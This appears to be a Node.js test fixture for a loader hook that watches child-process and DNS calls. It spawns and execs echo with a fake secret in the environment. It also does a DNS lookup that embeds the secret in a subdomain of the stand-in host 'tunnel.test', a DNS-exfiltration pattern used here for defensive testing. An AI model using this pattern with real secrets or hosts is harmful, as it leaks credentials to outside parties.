// test/fixtures/loader-hook-cases.js
const { spawn, exec } = require('node:child_process');
const dns = require('node:dns');

const secret = process.env.TEST_SECRET_KEY || ['sk', 'test', 'fixture_secret_value_12345'].join('_');

// 1. Test child_process.spawn
try {
  spawn('echo', ['spawn-test'], {
    env: { TEST_SECRET_KEY: secret }
  });
} catch (err) {
  console.log('SPAWN_BLOCKED:', err.message);
}

// 2. Test child_process.exec
try {
  exec('echo exec-test', {
    env: { TEST_SECRET_KEY: secret }
  });
} catch (err) {
  console.log('EXEC_BLOCKED:', err.message);
}

// 3. Test DNS resolution
try {
  dns.lookup(`${secret}.tunnel.test`, () => {});
} catch (err) {
  console.log('DNS_LOOKUP_THROWN:', err.message);
}
